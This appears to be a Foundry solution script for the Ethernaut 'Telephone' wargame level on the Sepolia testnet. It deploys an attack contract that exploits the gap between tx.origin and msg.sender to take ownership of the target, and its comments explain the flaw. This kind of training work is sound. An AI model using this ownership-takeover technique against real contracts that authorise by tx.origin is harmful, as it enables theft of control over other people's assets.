// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Telephone} from "../src/Telephone.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0xab770b2cb1978c33372d849e015fd5cd116ec2d4

contract TelephoneSolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/Telephone.s.sol --tc TelephoneSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    Telephone telephoneInstance = Telephone(0xaB770b2cB1978C33372d849E015fD5cD116EC2D4);
    TelephoneAttack attackContract = TelephoneAttack(0x0F5bEC13DAb855f6Fc3f236691361a0e51536EAc);

    function run() external {
        // Deploy Telephone contract (It is better to deploy your instance for the contract to avoid errors)
        if (address(telephoneInstance) == address(0)) {
            telephoneInstance = _deployTelephoneContract();
        }
        // We will simulate the attack by the second address, whici is in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);

        // We will deploy the attack contract, if we don't have one.
        // You can use our contract in your testing
        if (address(attackContract) == address(0)) {
            attackContract = new TelephoneAttack(address(telephoneInstance));
            console.log("TelephoneAttack address:", address(attackContract));
        }
        // - As you can see in the `Telephone` contract, to change the owner `tx,origin` differes from `msg.sender`
        // - `tx.origin` original sender of the transaction. If the transaction called another contract, tx.origin will
        //   always point to the external address that initiated the transaction.
        // - If the caller called only one function, tx.origin wil be the same to msg.sender
        // - If the tx called a function that calls another function in a contract, msg.sender changes, but the tx.origin doesn't change.
        // - So to claim the ownership we need to make a contract that calls `Telephone::changeOwner` function,
        //   then call the function that calls the `changeOwner` funciton in `Telephone` contract
        // - We will path the test and change the owner of the contract

        console.log("owner:", telephoneInstance.owner());
        attackContract.attack();
        console.log("new owner:", telephoneInstance.owner());

        vm.stopBroadcast();
    }

    function _deployTelephoneContract() internal returns (Telephone) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Telephone telephoneInstance = new Telephone();
        console.log("Telephone address:", address(telephoneInstance));
        vm.stopBroadcast();
        return telephoneInstance;
    }
}

contract TelephoneAttack {
    Telephone telephoneInstance;

    constructor(address target) {
        telephoneInstance = Telephone(target);
    }

    function attack() public {
        telephoneInstance.changeOwner(msg.sender);
    }
}
